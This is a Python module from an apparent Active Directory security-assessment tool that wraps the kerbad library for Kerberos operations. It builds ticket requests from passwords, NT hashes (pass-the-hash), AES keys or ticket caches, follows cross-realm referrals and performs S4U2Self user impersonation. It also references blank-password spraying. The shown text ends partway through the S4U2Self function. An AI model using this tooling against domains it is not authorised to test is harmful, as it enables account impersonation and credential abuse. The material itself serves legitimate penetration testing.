"""kerbad transport adapter for ADscan Kerberos operations.

This module mirrors the ``smb_transport`` and ``ldap_transport_service`` patterns:
it owns the URL-string builder, credential priority selection, async factory
functions, and exception translation for all kerbad-backed Kerberos consumers
inside ``adscan_internal``.

Only this file should import from ``kerbad`` — all other services use the
factory functions and exception classes defined here.

Cross-realm note (PingPong / AES-only environments):
    When ``auth_kdc_ip`` differs from ``kdc_ip``, the caller intends to
    authenticate against one KDC (auth domain) and request cross-realm
    referrals to reach the target domain.  ``get_tgt`` uses ``auth_kdc_ip``
    for the AS-REQ; ``get_tgs`` calls ``get_referral_ticket`` via ``kerbad``
    if ``target_domain`` is provided and differs from ``config.domain``.

etypes note:
    ``KerberosConfig.etypes`` is wired through to ``get_TGT(override_etype=...)``.
    kerbad respects this list when building AS-REQ and TGS-REQ payloads.
    When ``etypes=[18, 17]`` (AES-only), RC4 will not be offered in the
    negotiation, which is required for environments that enforce AES.
"""

from __future__ import annotations

import urllib.parse
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import NoReturn, Optional, TYPE_CHECKING

from adscan_internal import telemetry
from adscan_core.rich_output import print_info_debug
from adscan_internal.services.domain_posture import (
    ConstraintCategory,
    PostureSignal,
    SignalConfidence,
    TriState,
)

if TYPE_CHECKING:  # pragma: no cover
    from adscan_internal.services.domain_posture import DomainPosture

# Importing this module monkey-patches AIOKerberosClient.with_clock_skew so
# every kerbad-driven flow (kerberos_transport, badauth, badldap, aiosmb)
# transparently recovers from KRB_AP_ERR_TKT_EXPIRED / TKT_NYV / TGT_REVOKED
# by re-issuing an AS-REQ. Idempotent on repeated imports.
from adscan_internal.services import _kerberos_recovery  # noqa: F401


# ---------------------------------------------------------------------------
# Posture sink type alias
# ---------------------------------------------------------------------------


from adscan_internal.services.posture_sink import (  # noqa: E402,F401
    PostureSink,
    make_workspace_posture_sink,
)


# ---------------------------------------------------------------------------
# Domain-specific exception hierarchy
# ---------------------------------------------------------------------------


class KerberosTransportError(Exception):
    """Base class for all ADscan Kerberos transport errors."""


class KerberosAuthError(KerberosTransportError):
    """Authentication failed (KDC_ERR_PREAUTH_FAILED, bad password/hash)."""


class KerberosClockSkewError(KerberosTransportError):
    """Clock skew too large (KRB_AP_ERR_SKEW). Caller should sync and retry."""


class KerberosEtypeError(KerberosTransportError):
    """No supported encryption type (KDC_ERR_ETYPE_NOSUPP)."""


class KerberosPrincipalError(KerberosTransportError):
    """Unknown client or service principal (KDC_ERR_C_PRINCIPAL_UNKNOWN / KDC_ERR_S_PRINCIPAL_UNKNOWN)."""


# ---------------------------------------------------------------------------
# Config dataclass
# ---------------------------------------------------------------------------


@dataclass
class KerberosConfig:
    """Unified credential + target description for one Kerberos operation.

    Priority when multiple credential fields are set:
        ccache_bytes > ccache_path > kirbi_path > aes_key > nt_hash > password

    Cross-realm fields:
        domain       — the domain being enumerated / targeted (where SPNs live)
        kdc_ip       — KDC IP for the *target* domain
        auth_kdc_ip  — KDC IP for the *authenticating* domain (when auth domain
                       differs from target domain, e.g. ping.htb → pong.htb).
                       When None, kdc_ip is used for both roles.

    Attributes:
        domain:              Target/auth Kerberos realm (FQDN, e.g. "essos.local").
        kdc_ip:              KDC IP address for the target domain.
        username:            Account name (sAMAccountName, no domain prefix).
        password:            Plaintext password.
        nt_hash:             32-hex NT hash (pass-the-hash).
        aes_key:             AES-256 (64 hex) or AES-128 (32 hex) key.
        ccache_path:         Path to an existing .ccache file on disk.
        ccache_bytes:        In-memory ccache (higher priority than ccache_path).
        kirbi_path:          Path to an existing .kirbi file.
        cert_pfx_path:       PFX/PKCS#12 certificate for PKINIT.
        cert_pfx_password:   Password for the PFX file.
        etypes:              Explicit etype list (e.g. [18, 17] for AES-only).
                             When None, kerbad's default list is used.
        auth_kdc_ip:         KDC for the authenticating domain (cross-realm).
        timeout:             Per-operation timeout in seconds.
        posture_sink:        Optional callable invoked when this transport
                             observes a domain-wide Kerberos posture signal
                             (e.g. KDC enforces AES-only). Receives one
                             ``PostureSignal`` and may return an
                             ``IntelligenceFinding`` for the caller to surface
                             to the user. When ``None`` (default), posture
                             signals are silently dropped — the transport
                             remains a pure protocol module with no workspace
                             coupling.
        posture_snapshot:    Optional immutable snapshot of the domain's posture.
                             When set, ``get_tgt`` and ``get_tgs`` use
                             ``build_kerberos_plan`` to apply posture-driven
                             etype selection and probe decisions. When ``None``
                             (default), conservative behavior is used (kerbad
                             default etypes, standard probe logic).
    """

    domain: str
    kdc_ip: str
    username: str
    password: Optional[str] = None
    nt_hash: Optional[str] = None
    aes_key: Optional[str] = None
    ccache_path: Optional[str] = None
    ccache_bytes: Optional[bytes] = None
    kirbi_path: Optional[str] = None
    cert_pfx_path: Optional[str] = None
    cert_pfx_password: Optional[str] = None
    etypes: Optional[list[int]] = None
    auth_kdc_ip: Optional[str] = None  # cross-realm: KDC for auth domain
    target_kdc_ip: Optional[str] = (
        None  # cross-realm: KDC for target domain (for referral resolution)
    )
    timeout: int = 30
    posture_sink: Optional[PostureSink] = None
    posture_snapshot: Optional["DomainPosture"] = None
    disable_self_heal: bool = False
    """When True, ``get_tgt`` will NOT retry with a healed etype list on
    ``KDC_ERR_ETYPE_NOTSUPP`` — the raw failure propagates so the caller
    can classify it. Set by failure-eliciting consumers (the
    ``KERBEROS_RC4`` posture probe is the canonical example). See
    ``ADscanLDAPConfig.disable_self_heal`` for the full rationale.
    """

    def __post_init__(self) -> None:
        # Auto-route an NT hash that landed in the password field. Centralised
        # so every KerberosConfig consumer is fixed at once — see
        # services/credential_routing.py.
        from adscan_internal.services.credential_routing import (
            promote_credential_fields,
        )

        self.password, self.nt_hash, self.aes_key, self.ccache_path = (
            promote_credential_fields(
                password=self.password,
                nt_hash=self.nt_hash,
                aes_key=self.aes_key,
                ccache_path=self.ccache_path,
            )
        )

        # Promote bare KDC addresses to FQDN — same contract as
        # normalize_kerberos_target_hostname: IPs unchanged, FQDNs unchanged,
        # bare labels → "<label>.<domain>".  This prevents KDC_ERR_WRONG_REALM
        # when callers accidentally pass pdc_hostname instead of the IP.
        from adscan_internal.services._kerberos_spn import (
            normalize_kerberos_target_hostname,
        )

        self.kdc_ip = (
            normalize_kerberos_target_hostname(self.kdc_ip, self.domain)
            or self.kdc_ip
        )
        if self.auth_kdc_ip:
            self.auth_kdc_ip = (
                normalize_kerberos_target_hostname(self.auth_kdc_ip, self.domain)
                or self.auth_kdc_ip
            )
        if self.target_kdc_ip:
            self.target_kdc_ip = (
                normalize_kerberos_target_hostname(self.target_kdc_ip, self.domain)
                or self.target_kdc_ip
            )


# ---------------------------------------------------------------------------
# URL builder
# ---------------------------------------------------------------------------


def _encode(value: str) -> str:
    """URL-encode a single credential component."""
    return urllib.parse.quote(value, safe="")


def _build_kerberos_url(config: KerberosConfig, *, use_auth_kdc: bool = False) -> str:
    """Build a kerbad-compatible ``kerberos+<type>://DOMAIN\\user:secret@kdc_ip`` URL.

    Priority (highest first):
        ccache_bytes  — written to a temp location by callers before building URL
        ccache_path   — ``kerberos+ccache://``
        kirbi_path    — ``kerberos+kirbi://``
        aes_key       — ``kerberos+aes://`` (auto-selects aes128/aes256 by length)
        nt_hash       — ``kerberos+nt://``
        password      — ``kerberos+password://``

    ``use_auth_kdc=True`` substitutes ``auth_kdc_ip`` as the target host, which
    is required for cross-realm flows where the AS-REQ must reach the auth KDC.
    """
    kdc = config.auth_kdc_ip if (use_auth_kdc and config.auth_kdc_ip) else config.kdc_ip
    # Defensive: __post_init__ should have promoted bare hostnames already.
    if kdc and "." not in str(kdc):
        from adscan_internal.services._kerberos_spn import is_ip_address
        from adscan_internal import print_info_debug
        if not is_ip_address(kdc):
            print_info_debug(
                f"[kerberos_transport] bare hostname {kdc!r} reached URL builder as KDC — "
                "expected FQDN or IP (was KerberosConfig.__post_init__ bypassed?); "
                f"domain={config.domain!r}"
            )
    domain_upper = config.domain.upper()
    user_part = f"{_encode(domain_upper)}\\{_encode(config.username)}"

    if config.ccache_path:
        return f"kerberos+ccache://{user_part}:{_encode(config.ccache_path)}@{kdc}"
    if config.kirbi_path:
        return f"kerberos+kirbi://{user_part}:{_encode(config.kirbi_path)}@{kdc}"
    if config.aes_key:
        return f"kerberos+aes://{user_part}:{_encode(config.aes_key)}@{kdc}"
    if config.nt_hash:
        return f"kerberos+nt://{user_part}:{_encode(config.nt_hash)}@{kdc}"
    if config.password is not None:
        # ``is not None`` (not truthiness): an EMPTY password ('') is a valid
        # credential (a genuinely blank-password account — found by the native
        # blank spray — must verify/authenticate). The URL carries no secret for
        # an empty password (the factory parses '' as None); ``get_tgt`` restores
        # the empty password on the credential after the client is built.
        return f"kerberos+password://{user_part}:{_encode(config.password)}@{kdc}"
    raise KerberosTransportError(
        "KerberosConfig has no usable credential (ccache/kirbi/aes/nt/password)"
    )


# ---------------------------------------------------------------------------
# Posture signal emission
# ---------------------------------------------------------------------------


def _emit_posture_signal(
    config: "KerberosConfig",
    *,
    category: ConstraintCategory,
    state: TriState,
    confidence: SignalConfidence,
    signal_code: str,
    message: str,
    protocol: str = "kerberos",
) -> None:
    """Emit a Kerberos posture signal to the configured sink, if any.

    Pure best-effort: any exception in the sink is captured via telemetry
    and never propagates — posture telemetry must never break a TGT/TGS
    operation.

    Args:
        config: The active ``KerberosConfig``; the ``posture_sink`` field is
            consulted. When ``None``, this is a no-op.
        category: Which posture constraint this signal belongs to.
        state: The observed tri-state for the constraint.
        confidence: Confidence in the observation.
        signal_code: Stable machine-readable code (e.g. ``KDC_ERR_ETYPE_NOTSUPP``).
        message: Human-readable description.
        protocol: Originating protocol label (default ``"kerberos"``).
    """
    sink = config.posture_sink
    if sink is None:
        return
    try:
        signal = PostureSignal(
            domain=config.domain,
            category=category,
            state=state,
            confidence=confidence,
            source="kerberos_transport",
            signal_code=signal_code,
            message=message,
            protocol=protocol,
            observed_at=datetime.now(timezone.utc),
        )
        sink(signal)
    except Exception as sink_exc:
        telemetry.capture_exception(sink_exc)
        print_info_debug(
            f"[kerberos_transport] posture sink raised: "
            f"{type(sink_exc).__name__}: {sink_exc}"
        )


def _emit_kerberos_failure_posture(
    config: "KerberosConfig", exc: BaseException
) -> None:
    """Translate a kerbad failure into posture signals when applicable.

    Inspects ``exc.errorcode`` and emits ``KERBEROS_RC4 → DISABLED`` plus
    ``KERBEROS_AES_ONLY → ENABLED`` (both HIGH confidence) on
    ``KDC_ERR_ETYPE_NOTSUPP``. Any other failure is ignored — posture
    detection must never break the original failure path.
    """
    try:
        from kerbad.protocol.errors import KerberosErrorCode  # noqa: PLC0415

        code = getattr(exc, "errorcode", None)
        if code == KerberosErrorCode.KDC_ERR_ETYPE_NOTSUPP:
            _emit_posture_signal(
                config,
                category=ConstraintCategory.KERBEROS_RC4,
                state=TriState.DISABLED,
                confidence=SignalConfidence.HIGH,
                signal_code="KDC_ERR_ETYPE_NOTSUPP",
                message=(
                    "KDC rejected requested encryption type — "
                    "domain enforces AES-only Kerberos"
                ),
            )
            _emit_posture_signal(
                config,
                category=ConstraintCategory.KERBEROS_AES_ONLY,
                state=TriState.ENABLED,
                confidence=SignalConfidence.HIGH,
                signal_code="KDC_ERR_ETYPE_NOTSUPP",
                message="AES-only Kerberos enforced by KDC",
            )
    except Exception:
        # Posture detection must never break the original failure path.
        pass


# ---------------------------------------------------------------------------
# Exception translation
# ---------------------------------------------------------------------------


def _raise_translated_kerbad_error(exc: Exception) -> NoReturn:
    """Translate a kerbad exception and raise the matching ADscan domain exception.

    kerbad surfaces errors via ``KerberosErrorCode`` attached to
    ``KerberosError``.  We inspect the ``errorcode`` attribute and the
    string representation to classify cleanly.

    Always raises; never returns.
    """
    try:
        from kerbad.protocol.errors import KerberosErrorCode  # noqa: PLC0415

        code = getattr(exc, "errorcode", None)
        if code is not None:
            if code in (
                KerberosErrorCode.KDC_ERR_PREAUTH_FAILED,
                KerberosErrorCode.KDC_ERR_CLIENT_REVOKED,
                KerberosErrorCode.KDC_ERR_KEY_EXPIRED,
            ):
                raise KerberosAuthError(str(exc)) from exc
            if code == KerberosErrorCode.KRB_AP_ERR_SKEW:
                raise KerberosClockSkewError(str(exc)) from exc
            if code == KerberosErrorCode.KDC_ERR_ETYPE_NOTSUPP:
                raise KerberosEtypeError(str(exc)) from exc
            if code in (
                KerberosErrorCode.KDC_ERR_C_PRINCIPAL_UNKNOWN,
                KerberosErrorCode.KDC_ERR_S_PRINCIPAL_UNKNOWN,
            ):
                raise KerberosPrincipalError(str(exc)) from exc
    except KerberosTransportError:
        raise
    except Exception:
        pass

    msg = str(exc).lower()
    if "preauth" in msg or "password" in msg or "bad cred" in msg:
        raise KerberosAuthError(str(exc)) from exc
    if "skew" in msg or "clock" in msg:
        raise KerberosClockSkewError(str(exc)) from exc
    if "etype" in msg or "enctype" in msg:
        raise KerberosEtypeError(str(exc)) from exc
    if "principal" in msg or "not found" in msg:
        raise KerberosPrincipalError(str(exc)) from exc
    raise KerberosTransportError(str(exc)) from exc


# ---------------------------------------------------------------------------
# AES salt pre-probe (Bug #4 fix)
# ---------------------------------------------------------------------------


def _emit_etype_probe_diagnostic(client: object, config: "KerberosConfig") -> None:
    """Summarize the ETYPE-INFO2 salt-probe decision into a --debug recording.

    Diagnostic-only. Lets the intermittent AES-only ``KDC_ERR_ETYPE_NOTSUPP``
    (first TGT mint OK, later mints fail with the same user/salt/KDC) be
    root-caused from a ``--debug`` recording without needing vendor DEBUG.

    The resolved salt, the etype names the KDC advertised in ETYPE-INFO2, and
    whether ``server_supp_enc_methods`` was populated are NOT secrets and are
    safe to log. Key material (AES key / NT hash / password) is never logged.
    The principal/domain are masked via ``mark_sensitive``. Bracket-free marker
    (Rich silently drops ``[bracketed]`` prefixes). Best-effort; never raises.
    """
    try:
        from adscan_internal.rich_output import mark_sensitive  # noqa: PLC0415

        supp = getattr(client, "server_supp_enc_methods", None) or {}
        try:
            supp_names = [getattr(et, "name", str(et)) for et in supp.keys()]
        except Exception:
            supp_names = None
        masked_domain = mark_sensitive(getattr(config, "domain", "") or "", "domain")
        masked_user = mark_sensitive(getattr(config, "username", "") or "", "user")
        print_info_debug(
            "kdc-etype-probe: user=%s domain=%s server_salt_set=%s "
            "supp_enc_etypes=%s supp_populated=%s"
            % (
                masked_user,
                masked_domain,
                getattr(client, "server_salt", None) is not None,
                supp_names,
                bool(supp),
            )
        )
    except Exception:
        pass


async def _probe_and_set_etype_info2_salt(
    client: object, config: "KerberosConfig"
) -> bool:
    """Send an unauthenticated AS-REQ to obtain ETYPE-INFO2 salt from the KDC.

    Correctness note (post 2026-06 vendor fix): salt-correctness is now
    guaranteed at the vendor layer. ``kerbad.aioclient.get_TGT`` runs the same
    ETYPE-INFO2 probe-first itself (gated on password creds with no pre-seeded
    salt), so EVERY Kerberos consumer derives the right AES key on non-default
    salt KDCs without this wrapper. This wrapper is therefore a redundant first
    round-trip for *correctness* — but it is KEPT because it additionally emits
    the ``KERBEROS_ETYPE_PROBE`` posture signal that the vendor fix cannot (the
    vendor must not import ADscan or touch the posture bus). Belt-and-suspenders:
    correctness from the vendor, posture observation from here.

    AES-only / non-default-salt KDCs (e.g. hardened AD environments like
    PingPong) require the AES key to be derived using the exact salt advertised
    in ETYPE-INFO2. By sending a bare AS-REQ first (no pre-auth), the KDC replies
    with ``KDC_ERR_PREAUTH_REQUIRED`` + ETYPE-INFO2. We parse the salt from that
    response, store it in ``client.server_salt`` (the vendor probe-first picks
    up the pre-seeded value and skips its own probe), and emit a posture signal
    when the advertised AES salt is non-default.

    This is a no-op if the credential is not password-based (hash/ccache/kirbi
    credentials do not need salt derivation) or if the initial unauthenticated
    AS-REQ raises anything other than a KerberosError carrying e-data.

    Args:
        client: The kerbad ``AIOKerberosClient`` to mutate.
        config: The active ``KerberosConfig`` (used for posture signal emission
            when the KDC advertises a non-default AES salt).

    Returns:
        ``True`` when the probe discovered a non-default AES salt and set
        ``client.server_salt``; ``False`` when no probe was needed, the probe
        failed, or the salt was the default (no posture-relevant observation).
    """
    try:
        from kerbad.protocol.errors import KerberosError, KerberosErrorCode  # noqa: PLC0415
        from kerbad.protocol.constants import EncryptionType  # noqa: PLC0415
    except ImportError:
        return False

    # Only meaningful for password-based auth where AES key derivation uses a salt.
    cred = getattr(client, "credential", None)
    if cred is None:
        return False
    if getattr(cred, "password", None) is None:
        return False

    try:
        # Always probe with AES256 (etype 18).  AES-only KDCs advertise the AES
        # salt in ETYPE-INFO2; RC4 entries typically have salt=None.  Probing with
        # RC4 would cause select_preferred_encryption_method to pick RC4 and leave
        # server_salt=None, giving KDC_ERR_PREAUTH_FAILED on AES auth.
        probe_etype = EncryptionType.AES256_CTS_HMAC_SHA1_96
        req = client.build_asreq_lts(probe_etype, no_preauth=True)
        rep = await client.ksoc.sendrecv(req.dump())
        if rep.name == "KRB_ERROR":
            kerb_err = KerberosError(rep, "probe")
            if (
                getattr(kerb_err, "errorcode", None)
                == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED
                and kerb_err.krb_err_msg.get("e-data")
            ):
                client.select_preferred_encryption_method(kerb_err.krb_err_msg)
                # select_preferred_encryption_method picks the credential's preferred
                # etype (often RC4) which may have salt=None.  Explicitly set salt
                # from the AES256 entry if it was advertised and server_salt is None.
                if client.server_salt is None:
                    supp = getattr(client, "server_supp_enc_methods", {}) or {}
                    for aes_et in (
                        EncryptionType.AES256_CTS_HMAC_SHA1_96,
                        EncryptionType.AES128_CTS_HMAC_SHA1_96,
                    ):
                        aes_salt = supp.get(aes_et)
                        if aes_salt is not None:
                            client.server_salt = (
                                aes_salt.encode()
                                if isinstance(aes_salt, str)
                                else aes_salt
                            )
                            break
                _emit_etype_probe_diagnostic(client, config)
                if client.server_salt is not None:
                    _emit_posture_signal(
                        config,
                        category=ConstraintCategory.KERBEROS_ETYPE_PROBE,
                        state=TriState.ENABLED,
                        confidence=SignalConfidence.MEDIUM,
                        signal_code="ETYPE_INFO2_NONDEFAULT_SALT",
                        message=(
                            "KDC advertises non-default AES salt — "
                            "etype probe required for password auth"
                        ),
                    )
                    return True
    except Exception as probe_exc:
        # Non-fatal: if the probe fails for any reason, fall through to normal
        # get_TGT which will surface the real error.
        print_info_debug(
            f"[kerberos_transport] _probe_etype_info2: probe failed (non-fatal): {probe_exc}"
        )

    return False


# ---------------------------------------------------------------------------
# Public async factory functions
# ---------------------------------------------------------------------------


def _classify_recoverable_kerberos_failure(
    exc: BaseException,
    *,
    attempted_etypes: Optional[list[int]],
) -> Optional[list[int]]:
    """Identify a Kerberos failure whose fix is a posture-driven etype flip.

    Mirror of ``_classify_recoverable_bind_failure`` in the LDAP transport.
    Returns a new etype list to retry with, or ``None`` if the failure is
    not posture-recoverable / we already had the right etypes.

    Recovery rules (only one is triggered per call):

      * KDC rejected with ``KDC_ERR_ETYPE_NOTSUPP`` after we offered RC4
        (etype 23) → retry with AES (18 then 17). Signature confirmed
        against ``vendor/kerbad/protocol/errors.py``
        (``KDC_ERR_ETYPE_NOTSUPP = 0xE``).
      * Same error after we offered AES → retry with RC4 (legacy DCs that
        still require RC4 are rare but exist; emit a DISABLED signal for
        ``KERBEROS_AES_ONLY`` so the planner won't push AES blindly next
        run).

    Failures with no ``errorcode`` or any code other than
    ``KDC_ERR_ETYPE_NOTSUPP`` are NOT recoverable here — they are real
    auth / network / clock-skew issues and must surface to the caller.
    """
    try:
        from kerbad.protocol.errors import KerberosErrorCode  # noqa: PLC0415
    except Exception:  # noqa: BLE001
        return None

    code = getattr(exc, "errorcode", None)
    if code != KerberosErrorCode.KDC_ERR_ETYPE_NOTSUPP:
        return None

    # The set we actually sent to the KDC. ``None``/empty means "library
    # default" — we did not pin an explicit etype list, so we cannot see
    # which etype kerbad actually offered.
    sent = list(attempted_etypes or [])

    # Empty/None == library default. With kerbad's AES-first credential
    # ordering (vendor get_supported_enctypes) a password default already
    # picks AES, so this branch should rarely fire. But if a default attempt
    # STILL drew KDC_ERR_ETYPE_NOTSUPP, the overwhelmingly common cause is an
    # AES-only KDC rejecting an RC4 offer (e.g. an nt_hash-only credential, or
    # a stale vendor). Force AES once. If the credential genuinely cannot
    # derive AES keys (nt_hash only), the retry fails cleanly — no worse off,
    # and the posture signal we emit teaches the planner for next time.
    if not sent:
        return [18, 17]

    # Heuristic: classify the attempt by the FIRST etype offered.
    # KDC_ERR_ETYPE_NOTSUPP is returned when the intersection of our set
    # and the KDC's allowed set is empty — flipping to the complement
    # captures the recovery in one round-trip.
    if 23 in sent and 18 not in sent and 17 not in sent:
        # RC4-only attempt → DC is AES-only. Retry AES.
        return [18, 17]
    if (18 in sent or 17 in sent) and 23 not in sent:
        # AES-only attempt → DC is RC4-only (rare, legacy). Retry RC4.
        return [23]
    # Sent both and KDC still rejected — there is no recovery, the KDC
    # supports neither family we offer.
    return None


async def get_tgt(config: KerberosConfig) -> bytes:
    """Obtain a TGT and return it as ccache bytes.

    Uses kerbad ``AIOKerberosClient.get_TGT`` with automatic clock-skew
    handling.  The returned bytes can be written to a ``.ccache`` file or
    passed back as ``KerberosConfig.ccache_bytes`` to subsequent calls.

    When ``config.posture_snapshot`` is set, ``build_kerberos_plan`` is
    consulted to apply posture-driven etype selection and probe decisions,
    potentially skipping one round-trip in AES-only environments.

    Cross-realm:
        When ``config.auth_kdc_ip`` is set and differs from ``config.kdc_ip``,
        the AS-REQ is directed at ``auth_kdc_ip`` (the auth domain's KDC).

    Args:
        config: Unified Kerberos credential + target description.

    Returns:
        Serialized ccache contents (bytes) containing the freshly obtained TGT.

    Raises:
        KerberosAuthError: Wrong password/hash, or principal does not exist.
        KerberosClockSkewError: Clock drift too large.
        KerberosEtypeError: KDC does not support any of the requested etypes.
        KerberosPrincipalError: Client principal not found in KDC.
        KerberosTransportError: Any other network/protocol failure.
    """
    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
    from adscan_internal.services.auth_plan import build_kerberos_plan  # noqa: PLC0415

    url = _build_kerberos_url(config, use_auth_kdc=True)
    print_info_debug("[kerberos_transport] get_tgt: building client from URL")

    try:
        cu = KerberosClientFactory.from_url(url)
        client = cu.get_client()

        # Empty-password (blank) credential: the URL carries no secret, so the
        # factory leaves the credential password as None. Restore the EMPTY
        # password on the built credential so AS-REQ key derivation runs (kerbad's
        # creds.py treats '' as valid — RC4 = empty NT hash, AES = string_to_key('')).
        # This is what makes verifying/authenticating a genuinely blank account work
        # through the standard transport, not just the native blank-spray helper.
        if config.password == "" and getattr(client, "credential", None) is not None:
            client.credential.password = ""
            client.credential.nt_hash = None

        # PR9: Build posture-driven Kerberos plan.
        plan = build_kerberos_plan(config=config, posture=config.posture_snapshot)
        if plan.is_pruned:
            print_info_debug(
                f"[kerberos_transport] posture plan applied: {plan.attempt.rationale}"
            )

        # Determine effective etypes (plan overrides config when non-empty).
        effective_etypes = (
            plan.attempt.etypes if plan.attempt.etypes else (config.etypes or None)
        )

        # Determine whether to run the ETYPE-INFO2 salt probe.
        # Conservative baseline: run probe for password credentials only.
        # plan.attempt.force_etype_probe: always run (posture says non-default salt).
        # plan.attempt.skip_etype_probe: skip for password credentials (standard salt confirmed).
        should_probe = (
            config.password is not None and not plan.attempt.skip_etype_probe
        ) or plan.attempt.force_etype_probe

        nondefault_salt_found = False
        if should_probe:
            nondefault_salt_found = await _probe_and_set_etype_info2_salt(
                client, config
            )

        override_etype = effective_etypes if effective_etypes else None

        # Self-healing retry budget: KDC rejection on etype is the one
        # failure mode where a single posture-driven flip lets the
        # session recover in place. We try once with the active config,
        # and if the KDC returns KDC_ERR_ETYPE_NOTSUPP we ask
        # ``_classify_recoverable_kerberos_failure`` for a complementary
        # etype list and retry once. Anything else (clock skew, wrong
        # password, principal-unknown) is NOT retried — those are real
        # errors and must surface to the caller.
        try:
            await client.with_clock_skew(client.get_TGT, override_etype=override_etype)
        except Exception as krb_exc:
            if config.disable_self_heal:
                # Caller wants the raw failure (probe context). Skip the
                # etype recovery entirely and let the exception propagate
                # untouched so the probe can classify it.
                raise
            recovery_etypes = _classify_recoverable_kerberos_failure(
                krb_exc, attempted_etypes=override_etype
            )
            if recovery_etypes is None:
                raise
            # Posture-emit BEFORE retry so the planner learns even if
            # the retry also fails.
            _emit_kerberos_failure_posture(config, krb_exc)
            print_info_debug(
                f"[kerberos_transport] self-heal: KDC_ERR_ETYPE_NOTSUPP on "
                f"etypes={override_etype} → retry with {recovery_etypes}"
            )
            await client.with_clock_skew(
                client.get_TGT, override_etype=recovery_etypes
            )

        # Bug #1 fix: CCACHE.to_file() only accepts a path string.
        # Use CCACHE.to_bytes() directly — no tempfile needed.
        ccache_bytes = client.ccache.to_bytes()
        print_info_debug(
            f"[kerberos_transport] get_tgt: success, ccache size={len(ccache_bytes)}"
        )

        # Negative posture: password auth succeeded without a non-default salt
        # probe being needed — the environment uses standard Kerberos salts.
        if config.password and not nondefault_salt_found:
            _emit_posture_signal(
                config,
                category=ConstraintCategory.KERBEROS_ETYPE_PROBE,
                state=TriState.DISABLED,
                confidence=SignalConfidence.MEDIUM,
                signal_code="STANDARD_SALT_OK",
                message="Standard Kerberos salt — no probe required",
            )

        return ccache_bytes

    except KerberosTransportError:
        raise
    except Exception as exc:
        _emit_kerberos_failure_posture(config, exc)
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)


async def get_tgs(
    config: KerberosConfig,
    spn: str,
    *,
    target_domain: Optional[str] = None,
) -> bytes:
    """Obtain a TGS for the given SPN and return it as ccache bytes.

    Sequence:
        1. Obtain TGT (AS-REQ → AS-REP) against the KDC in ``config``.
        2. If ``target_domain`` is provided and differs from ``config.domain``,
           follow cross-realm referrals via ``get_referral_ticket``.
        3. Send TGS-REQ for ``spn`` to the resolved KDC.

    When ``config.posture_snapshot`` is set, the same posture plan used by
    ``get_tgt`` is applied to the initial AS-REQ inside this function.

    Args:
        config: Unified Kerberos credential + target description.
        spn:    Service Principal Name, e.g. "cifs/dc01.essos.local".
        target_domain: Target realm when the SPN lives in a different domain
            (e.g. "pong.htb" when authenticating from "ping.htb").

    Returns:
        Serialized ccache contents (bytes) containing the TGS.

    Raises:
        KerberosAuthError, KerberosClockSkewError, KerberosEtypeError,
        KerberosPrincipalError, KerberosTransportError.
    """
    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
    from kerbad.common.spn import KerberosSPN  # noqa: PLC0415
    from adscan_internal.services.auth_plan import build_kerberos_plan  # noqa: PLC0415

    url = _build_kerberos_url(config, use_auth_kdc=True)
    print_info_debug(f"[kerberos_transport] get_tgs: spn={spn}")

    try:
        cu = KerberosClientFactory.from_url(url)
        client = cu.get_client()

        # PR9: Build posture-driven Kerberos plan.
        plan = build_kerberos_plan(config=config, posture=config.posture_snapshot)
        if plan.is_pruned:
            print_info_debug(
                f"[kerberos_transport] posture plan applied: {plan.attempt.rationale}"
            )

        # Determine effective etypes (plan overrides config when non-empty).
        effective_etypes = (
            plan.attempt.etypes if plan.attempt.etypes else (config.etypes or None)
        )

        # Determine probe behavior (same logic as get_tgt).
        should_probe = (
            config.password is not None and not plan.attempt.skip_etype_probe
        ) or plan.attempt.force_etype_probe

        if should_probe:
            await _probe_and_set_etype_info2_salt(client, config)

        override_etype = effective_etypes if effective_etypes else None
        await client.with_clock_skew(client.get_TGT, override_etype=override_etype)

        cross_realm = (
            target_domain is not None and target_domain.lower() != config.domain.lower()
        )
        if cross_realm:
            print_info_debug(
                f"[kerberos_transport] get_tgs: cross-realm referral "
                f"{config.domain} -> {target_domain}"
            )
            # target_kdc_ip: the target domain's KDC (not the auth domain's KDC).
            # Using the auth KDC here produces KDC_ERR_WRONG_REALM.
            target_ip = config.target_kdc_ip or config.kdc_ip
            _, _, _, new_factory = await client.with_clock_skew(
                client.get_referral_ticket, target_domain, target_ip
            )
            client = new_factory.get_client()

        # Bug #3 fix: kerbad's from_spn() requires an @REALM suffix.
        realm = (target_domain or config.domain).upper()
        if "@" not in spn:
            spn = f"{spn}@{realm}"
        spn_obj = KerberosSPN.from_spn(spn)
        await client.with_clock_skew(
            client.get_TGS, spn_obj, override_etype=override_etype
        )

        # Bug #1 fix: use to_bytes() instead of to_file(BytesIO).
        ccache_bytes = client.ccache.to_bytes()
        print_info_debug(
            f"[kerberos_transport] get_tgs: success, ccache size={len(ccache_bytes)}"
        )
        return ccache_bytes

    except KerberosTransportError:
        raise
    except Exception as exc:
        _emit_kerberos_failure_posture(config, exc)
        telemetry.capture_exception(exc)
        _raise_translated_kerbad_error(exc)


async def s4u2self(
    config: KerberosConfig,
    *,
    target_user: str,
    service_spn: str,
    is_dmsa: bool = False,
) -> bytes:
    """Obtain an S4U2Self service ticket impersonating ``target_user``.

    Args:
        config:       Machine account / service account credentials.
        target_user:  UPN of the user to impersonate, e.g. "administrator@ESSOS.LOCAL".
        service_spn:  SPN of the service, e.g. "cifs/dc01.essos.local".
        is_dmsa:      Set True for delegated Managed Service Account flows
                      (uses PA_S4U_X509_USER padata rather than PA-FOR-USER).

    Returns:
        Serialized ccache bytes containing the S4U2Self ticket.

    Raises:
        KerberosTransportError and subclasses.
    """
    from kerbad.common.factory import KerberosClientFactory  # noqa: PLC0415
    from kerbad.common.spn import KerberosSPN  # noqa: PLC0415

    url = _build_kerberos_url(config)
    print_info_debug(
        f"[kerberos_transport] s4u2self: target_user={target_user} spn={service_spn}"
    )

    try:
        cu = KerberosClientFactory.from_url(url)
        client = cu.get_client()

        override_etype = config.etypes if config.etypes else None
        await client.with_clock_skew(client.get_TGT, override_etype=override_etype)

        target_spn = KerberosSPN.from_upn(target_user, default_realm=config.domain)
        service_spn_obj = KerberosSPN.from_spn(service_spn, default_realm=config.domain)
        await client.with_clock_skew(
            client.S4U2self, target_spn, service_spn_obj, is_dmsa=is_dmsa
        )

